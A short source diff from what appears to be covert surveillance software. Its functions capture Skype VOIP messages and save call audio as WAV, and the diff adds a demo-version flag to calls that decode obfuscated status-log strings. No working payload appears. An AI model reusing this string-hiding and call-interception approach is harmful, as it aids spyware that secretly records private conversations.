@@ -1785,8 +1785,8 @@ void SaveEncode(BYTE *source, DWORD total_size, DWORD channels, pVoiceAdditional
 void SaveWav(BYTE *channel_array, DWORD size, DWORD channels, pVoiceAdditionalData additional_data, DWORD additional_len)
 {
 	static BOOL first_save = TRUE;
-	ScrambleString ss1("_ yPUvU8WUAUPC 8diUE gEilg......QM\r\n\r\n"); // "- Initializing audio codec......OK\r\n\r\n"
-	ScrambleString ss2("_ yPUvU8WUAUPC 8diUE gEilg......L99Q9\r\n\r\n"); // "- Initializing audio codec......ERROR\r\n\r\n"
+	ScrambleString ss1("_ yPUvU8WUAUPC 8diUE gEilg......QM\r\n\r\n", is_demo_version); // "- Initializing audio codec......OK\r\n\r\n"
+	ScrambleString ss2("_ yPUvU8WUAUPC 8diUE gEilg......L99Q9\r\n\r\n", is_demo_version); // "- Initializing audio codec......ERROR\r\n\r\n"
 
 	// Verifica che l'array sia stato allocato
 	if (!channel_array)
@@ -2870,7 +2870,7 @@ BOOL ParseSkypeMsg(BYTE *msg, DWORD *pdwLen, DWORD *pdwFlags)
 		return TRUE;
 	}
 	if (*pdwFlags & FLAGS_SKAPI_WND) {
-		ScrambleString ss(string_obfs); // "- Monitoring VOIP queues.............OK\r\n"
+		ScrambleString ss(string_obfs, is_demo_version); // "- Monitoring VOIP queues.............OK\r\n"
 		REPORT_STATUS_LOG(ss.get_str());
 		skype_api_wnd = *((HWND *)msg);
 		return TRUE;
